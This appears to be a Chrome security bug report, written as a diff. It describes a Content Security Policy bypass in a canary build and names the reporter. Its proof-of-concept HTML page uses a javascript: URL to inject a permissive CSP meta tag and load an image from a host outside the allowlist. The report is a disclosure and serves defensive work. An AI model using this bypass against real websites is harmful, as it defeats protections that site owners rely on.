@@ -1,0 +1,22 @@
+VULNERABILITY DETAILS
+I found we can rewrite webpage's csp and archive load image from a non-whitelisted website using javascript:'<html>' URL
+VERSION
+Chrome Version: Version 84.0.4118.0 (Official Build) canary (64-bit)
+Operating System: ALL
+REPRODUCTION CASE
+Try this PoC html:
+<!DOCTYPE html>  
+<html>  
+<head>  
+  <meta http-equiv="content-security-policy" content="img-src http://127.0.0.1:8000">  
+</head>  
+<body>  
+<script>  
+    url = '<meta http-equiv="content-security-policy" content="default-src \*"><img src="https://abc.xyz/img/g-icon.jpg">';  
+    window.open("javascript:'"+url+"'","_self");  
+</script>  
+</body>  
+</html>  
+webpage only allow load images from http://127.0.0.1:8000, but we can use javascript:'' to rewrite this csp and archive loading image from abc.xyz.
+CREDIT INFORMATION
+Reporter credit: Zhiyang Zeng(@Wester) of OPPO ZIWU Cyber Security Lab
